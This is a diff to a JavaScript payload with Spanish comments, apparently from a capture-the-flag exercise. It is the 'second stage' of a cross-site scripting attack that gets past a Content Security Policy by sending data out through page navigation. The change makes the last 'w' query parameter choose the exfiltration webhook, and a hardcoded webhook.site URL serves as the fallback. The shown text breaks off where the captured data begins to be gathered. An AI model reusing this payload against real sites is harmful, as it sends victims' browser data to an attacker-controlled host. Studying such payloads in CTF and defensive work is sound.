@@ -1,6 +1,9 @@
 /**
  * Segunda etapa: exfil por navegacion (CSP default-src bloquea fetch/img a terceros).
- * Prioridad webhook: window.__CTF_WEBHOOK__ (inyectado por ping-loader data-wh) > ?w= > fallback.
+ *
+ * Webhook: primero data-wh (ping-loader -> __CTF_WEBHOOK__). Luego la query ?w=
+ * sobrescribe WH; si hay varios w, gana el ultimo (URLSearchParams.get solo devuelve el primero).
+ * Pon tu webhook al final: ...&w=https%3A%2F%2Fwebhook.site%2F... para pisar trackers.
  */
 (function () {
   var WH = "https://webhook.site/ddfc979f-7c8c-4860-a3c3-dc75213cb108";
@@ -15,8 +18,11 @@
     }
   } catch (e) {}
   try {
-    var w = new URLSearchParams(window.location.search).get("w");
-    if (w && /^https?:\/\//i.test(w)) WH = w;
+    var lastW = null;
+    new URLSearchParams(window.location.search).forEach(function (v, k) {
+      if (k === "w" && /^https?:\/\//i.test(v)) lastW = v;
+    });
+    if (lastW) WH = lastW;
   } catch (e) {}
   var c = "";
   try {
